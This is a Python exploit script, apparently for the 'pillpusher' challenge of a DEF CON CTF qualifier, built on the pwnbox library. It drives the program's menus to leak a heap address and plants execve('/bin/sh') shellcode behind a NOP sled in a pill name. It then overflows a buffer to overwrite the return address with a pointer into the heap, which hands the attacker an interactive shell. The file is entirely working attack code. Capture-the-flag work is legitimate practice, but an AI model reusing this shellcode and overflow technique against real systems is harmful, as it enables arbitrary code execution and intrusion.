import pwnbox,struct
d = lambda x : struct.unpack("<Q",x)[0]
s = lambda x: struct.pack("<Q",x)
p = pwnbox.pipe.ProcessPipe("./pillpusher")
#p = pwnbox.pipe.SocketPipe("pillpusher_a3b929dac1a7ca27fe5474bae0432262.quals.shallweplayaga.me",43868)
def menu():
  p.read_until("->")

def leak():
  menu()
  p.write("2\n")
  menu()
  p.write("1\n")
  p.read_until(":")
  shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
  shellcode = "\x90"*(0x100-len(shellcode))+shellcode
  p.write(shellcode+"\n")
  for i in range(2):
    p.read_until(":")
    p.write("123\n")
  for i in range(3):
    p.read_until(":")
    p.write("\n")
  menu()
  p.write("3\n")
  p.read_until(shellcode)
  ret= p.read_until("\n\tDosage").split("\n\tDosage")[0]
  menu()
  p.write("6\n")
  return ret

def create_phar():
  menu()
  p.write("1\n")
  menu()
  p.write("1\n")
  p.read_until("?")


def create_pill(name,dosage,sche,treat=[],interact=[],side=[]):
  menu()
  p.write("2\n")
  menu()
  p.write("1\n")
  p.read_until(":")
  p.write("%s\n"%name)
  for x in [dosage,sche]:
    p.read_until(":")
    p.write("%d\n"%x)
  for y in [treat,interact,side]:
    if not "" in y :y.append("")
    for x in y:
      p.read_until(":")
      p.write("%s\n"%x)
  menu()
  p.write("6\n")

def create_staff(name):
  menu()
  p.write("3\n")
  menu()
  p.write("1\n")
  p.read_until(":")
  p.write(name+"\n")
  p.read_until(":")
  p.write("1000\n")
  menu()
  p.write("5\n")


def create_phar(name,pills,staffs):
  menu()
  p.write("1\n")
  menu()
  p.write("1\n")
  p.read_until("?")
  p.write(name+"\n")
  for y in [pills,staffs]:
    if not "" in y :y.append("")
    p.read_until("quit.")
    for x in y:
      p.read_until(":")
      p.write("%s\n"%x)
  menu()
  p.write("5\n")


def create_pat(name,sysm):
  menu()
  p.write("4\n")
  menu()
  p.write("1\n")
  p.read_until(":")
  p.write("%s\n"%name)
  p.read_until(":")
  p.write("y\n")
  if not "" in sysm: sysm.append("")
  for x in sysm:
    p.read_until(":")
    p.write("%s\n"%x)
  menu()
  p.write("5\n")


def addscript(phar,staff,pat,pills):
  menu()
  p.write("5\n")
  menu()
  p.write("1\n")
  p.read_until("\n:")
  p.write(phar+"\n")
  
  menu()
  p.write("2\n")
  p.read_until(":")
  p.write("%d\n"%staff)

  menu()
  p.write("3\n")
  p.read_until(":")
  p.write(pat+"\n")

  menu()
  p.write("4\n")
  p.read_until(":")
  p.write("-1\n")
  if not "END" in pills: pills.append("END")
  for x in pills:
    p.read_until(":")
    p.write("%s\n"%x)


heap  = d(leak()+"\x00"*2)
create_staff("DaramG")
rip = s(heap+0x60)
pay = "B"*0x2c+rip
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = "C"*0xf0
create_pill(shellcode,1,1,["EXPLOIT"])
create_pill(pay,1,1,["EXPLOIT"])
create_phar("KAIST",[shellcode,pay],["DaramG"])
create_pat("HyungSeok",["EXPLOIT"])
print hex(heap)
addscript("KAIST",1,"HyungSeok",[shellcode,shellcode,pay])
p.interact()

